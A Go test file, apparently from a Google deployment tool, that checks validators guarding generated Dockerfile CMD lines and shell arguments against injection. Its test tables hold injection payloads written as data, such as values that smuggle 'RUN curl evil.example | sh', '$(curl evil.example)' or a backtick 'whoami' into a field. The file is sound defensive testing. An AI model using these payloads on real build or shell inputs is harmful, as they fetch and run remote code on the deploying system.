// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package util

import (
	"encoding/json"
	"strings"
	"testing"
	"unicode/utf8"
)

func TestValidateDockerfileSafe(t *testing.T) {
	tests := []struct {
		name    string
		value   string
		wantErr bool
	}{
		{name: "plain identifier", value: "myserver", wantErr: false},
		{name: "path with slashes and dots", value: "cmd/quickstart/main.go", wantErr: false},
		{name: "url", value: "http://127.0.0.1:8081", wantErr: false},
		{name: "empty string", value: "", wantErr: false},
		{name: "newline breaks out of the current instruction", value: "x\nRUN curl evil.example | sh\n#", wantErr: true},
		{name: "carriage return", value: "x\rRUN curl evil.example | sh", wantErr: true},
		{name: "double quote breaks out of a CMD JSON-array string", value: `x", "extra"]`, wantErr: true},
		{name: "backtick", value: "x`whoami`", wantErr: true},
		{name: "NUL byte", value: "x\x00y", wantErr: true},
		// A backslash keeps the CMD array parseable but silently changes the
		// decoded argument, so "http://x\ny" would reach the container with a
		// real newline in it.
		{name: "backslash escape decodes to a different value", value: `http://x\ny`, wantErr: true},
		// A lone backslash instead makes the array unparseable, and Docker
		// answers an unparseable exec form by rerunning it as shell form.
		{name: "trailing backslash breaks CMD JSON", value: `http://x\`, wantErr: true},
		{name: "tab is a control byte", value: "x\ty", wantErr: true},
		{name: "escape byte", value: "x\x1by", wantErr: true},
		// Non-ASCII is fine here: it cannot terminate a JSON string.
		{name: "non-ASCII", value: "http://café.example", wantErr: false},
		// Invalid UTF-8 keeps the array parseable, but the Dockerfile parser
		// and the JSON decoder both turn the byte into U+FFFD, so the container
		// receives a value nobody wrote.
		{name: "invalid UTF-8 does not survive to the container", value: "http://x\xffy", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDockerfileSafe(tt.value, "test value")
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateDockerfileSafe(%q) error = %v, wantErr %v", tt.value, err, tt.wantErr)
			}
		})
	}
}

func TestValidateShellArgSafe(t *testing.T) {
	tests := []struct {
		name    string
		value   string
		wantErr bool
	}{
		{name: "plain identifier", value: "myserver", wantErr: false},
		{name: "path with slashes and dots", value: "cmd/quickstart/main.go", wantErr: false},
		{name: "empty string", value: "", wantErr: false},
		{name: "semicolon command separator", value: "main.go; curl evil.example | sh #", wantErr: true},
		{name: "pipe to shell", value: "main.go | sh", wantErr: true},
		{name: "ampersand background/chain", value: "main.go && curl evil.example", wantErr: true},
		{name: "command substitution", value: "$(curl evil.example)", wantErr: true},
		{name: "backtick command substitution", value: "`curl evil.example`", wantErr: true},
		{name: "space", value: "main go", wantErr: true},
		{name: "newline", value: "x\nRUN curl evil.example | sh\n#", wantErr: true},
		{name: "double quote", value: `x"`, wantErr: true},
		{name: "backslash", value: `x\y`, wantErr: true},
		{name: "url is rejected (not a path)", value: "http://127.0.0.1:8081", wantErr: true},
		// Non-ASCII is admitted: every byte of a multi-byte UTF-8 rune is
		// >= 0x80, so none of them can be a shell metacharacter. Rejecting
		// these failed deploys that work today, which is the whole reason the
		// class is wider than a bare [A-Za-z0-9_./-].
		{name: "non-ASCII filename", value: "agenté", wantErr: false},
		{name: "non-ASCII directory component", value: "agentes/café/main.go", wantErr: false},
		{name: "non-Latin script", value: "агент", wantErr: false},
		// Not covered by the reason above: a raw 0xff is not a metacharacter,
		// but it never deployed either. The build warns about the encoding and
		// COPY then fails to find a file whose name came through as U+FFFD.
		{name: "invalid UTF-8", value: "agent\xff", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateShellArgSafe(tt.value, "test value")
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateShellArgSafe(%q) error = %v, wantErr %v", tt.value, err, tt.wantErr)
			}
		})
	}
}

// cmdArgs parses the exec-form CMD line cloudrun.go emits, with value
// interpolated as the --a2a_agent_url argument.
func cmdArgs(value string) ([]string, error) {
	var args []string
	err := json.Unmarshal([]byte(`["/app/main", "web", "--a2a_agent_url", "`+value+`"]`), &args)
	return args, err
}

// TestValidateDockerfileSafe_AcceptedValuesKeepCMDParseable pins the property
// the doc comment claims, which a table of hand-picked payloads cannot: every
// value the check accepts must leave the generated exec-form CMD parseable as a
// JSON array, and must survive the parse unchanged. Docker answers an
// unparseable exec form by silently rerunning the instruction as shell form, so
// a gap here is not a build failure but a change of execution mode.
func TestValidateDockerfileSafe_AcceptedValuesKeepCMDParseable(t *testing.T) {
	// Every single byte, so that no control byte, escape character or invalid
	// UTF-8 byte slips through unnoticed.
	for b := 0; b < 0x100; b++ {
		value := "http://x" + string([]byte{byte(b)}) + "y"
		if ValidateDockerfileSafe(value, "test value") != nil {
			continue
		}
		args, err := cmdArgs(value)
		if err != nil {
			t.Errorf("byte 0x%02x is accepted but makes the CMD line unparseable: %v", b, err)
			continue
		}
		if got := args[len(args)-1]; got != value {
			t.Errorf("byte 0x%02x is accepted but decodes to %q, want %q", b, got, value)
		}
	}

	// Every valid rune, as the valid UTF-8 that a flag value actually carries,
	// so that an accepted value also reaches the container as it was written.
	// Up to utf8.MaxRune rather than the BMP, so a supplementary-plane
	// character in a path (an emoji, CJK Ext-B) is covered by the claim above.
	for r := rune(0); r <= utf8.MaxRune; r++ {
		if !utf8.ValidRune(r) {
			continue
		}
		value := "http://x" + string(r) + "y"
		if ValidateDockerfileSafe(value, "test value") != nil {
			continue
		}
		args, err := cmdArgs(value)
		if err != nil {
			t.Errorf("rune %U is accepted but makes the CMD line unparseable: %v", r, err)
			continue
		}
		if got := args[len(args)-1]; got != value {
			t.Errorf("rune %U is accepted but decodes to %q, want %q", r, got, value)
		}
	}
}

// TestValidateShellArgSafe_ByteClass pins the allow-list: nothing outside the
// intended ASCII class may be accepted, and no valid non-ASCII rune may be
// rejected, since every byte of one is >= 0x80 and can never be a shell
// metacharacter or a Dockerfile token separator. A byte >= 0x80 outside a valid
// rune is a different case and is rejected.
func TestValidateShellArgSafe_ByteClass(t *testing.T) {
	const allowedASCII = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_./-"

	for b := 0; b < 0x80; b++ {
		accepted := ValidateShellArgSafe(string([]byte{byte(b)}), "test value") == nil
		want := strings.ContainsRune(allowedASCII, rune(b))
		if accepted != want {
			t.Errorf("byte 0x%02x accepted = %v, want %v", b, accepted, want)
		}
	}

	// Up to utf8.MaxRune, not just the BMP: a supplementary-plane character in
	// a directory name is as much a "valid non-ASCII rune" as a BMP one, and
	// the claim above covers it.
	for r := rune(0x80); r <= utf8.MaxRune; r++ {
		if !utf8.ValidRune(r) {
			continue
		}
		if err := ValidateShellArgSafe("agent"+string(r), "test value"); err != nil {
			t.Errorf("rune %U rejected: %v", r, err)
		}
	}

	for b := 0x80; b < 0x100; b++ {
		if err := ValidateShellArgSafe("agent"+string([]byte{byte(b)}), "test value"); err == nil {
			t.Errorf("lone byte 0x%02x accepted, want rejected: it is not part of a valid rune", b)
		}
	}
}
